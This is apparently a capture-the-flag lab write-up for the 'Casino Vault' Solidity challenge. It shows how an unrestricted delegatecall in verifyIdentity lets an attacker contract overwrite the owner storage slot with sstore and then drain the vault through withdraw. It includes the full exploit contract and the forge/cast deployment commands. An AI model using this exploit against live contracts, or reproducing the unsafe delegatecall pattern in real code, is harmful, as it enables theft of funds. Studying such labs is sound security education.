The Vault of this Casino can only be opened by the owner, what are we trying to do here is to take everything from the owner, but how? &nbsp;  
&nbsp;   
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import "./CasinoVault.sol";

contract Setup{
    CasinoVault public CS;

    constructor() payable{
        CS = new CasinoVault{value: 50 ether}();
    }

    function isSolved() public view returns(bool){
        return address(CS).balance == 0;
    }

}
```
&nbsp;  
it seems the Heist is successful when we managed to empty the Vault, a lot of work to be done here it seems huh? Let's look at what we're dealing with, the *CasinoVault Contract* &nbsp;  
&nbsp;  
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

contract CasinoVault {
    address public gameLogic;
    address public owner;

    constructor() payable {
        owner = msg.sender;
    }

    function verifyIdentity(address _identity, bytes memory data) public {
        (bool success, ) = _identity.delegatecall(data);
        require(success, "Verifying failed");
    }

    function withdraw() public {
        require(msg.sender == owner, "Not the owner");
        (bool transfered, ) = payable(owner).call{value: address(this).balance}("");
        require(transfered, "Withdrawal Failed!");
    }

    receive() external payable {}
    
}
```
&nbsp;  
We can see here that we can verifyIdentify by providing an *address* and a *bytes memory data*, they use deelgatecall there, delegate call are usually used like a "borrowed function", you execute the function in order to modify the state of the caller, in this case if we parse and address an execute the data there it will execute the data and modify the state of the *Casino Vault* itself. Unlinke Silent-Dealer where there is a function to change owner here the option doesn't present. So hwo can we become the Owner and drain the vault? &nbsp;  
&nbsp;  
In EVM Assembly, there is a operation called *sstore(location, value)*, we can use this to overwrite the storage memory, let's see where the *owner* reside, &nbsp;  
&nbsp;  

```solidity
    address public gameLogic; // SLOT 0
    address public owner; // SLOT 1
```
&nbsp;  
based on that information, we can see that the owner is stored at SLOT 1, and the length since it's an address must be 20 bytes long. Now that we have the 2 options, we can either put the owner to become ourselves (EOA) or we can write the Exploit Contract Address, this can be done by either providing *origin()* (EOA) or *caller()* (msg.sender, in this case is the Exploit Contract), as the parameter. So if we want to overwrite the storage we can use &nbsp;  
&nbsp;  

```
sstore(1, origin()) // for tx.origin / EOA
// or
sstore(1, caller()) // for msg.sender 
```
&nbsp;  
In this exploitation I choose to overwrite it using my EOA, so we are going to go with this exploit to drain the Vault &nbsp;  
&nbsp;  
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import "./Setup.sol";
import "./CasinoVault.sol";

contract Exploit {
    Setup public setup;
    CasinoVault public cs;

    constructor(address payable _setup) {
        setup = Setup(_setup);
        cs = CasinoVault(setup.CS());
    }

    function exploit() public {
        cs.verifyIdentity(address(this), abi.encodeWithSignature("takeOver()"));
    }

    function takeOver() public {
        assembly {
            sstore(1, origin()) 
        }
    }

}
```
&nbsp;  
Let's deploy it and at last we going to withdraw all the money stored there &nbsp;  
&nbsp;  
```bash
// Deploying the Exploit Contract
forge create src/casino-vault/$EXPLOIT_FILE:$EXPLOIT_NAME -r $RPC_URL --private-key $PK --constructor-args $SETUP_ADDR

// Running the Exploit
cast send -r $RPC_URL --private-key $PK $EXPLOIT_ADDR "exploit()"

// Withdrawing Everything from the Vault
cast send -r $RPC_URL --private-key $PK $VAULT_ADDR "withdraw()"
```
&nbsp;  
By running the command above and deploying the Exploit contract, you should've solved the lab!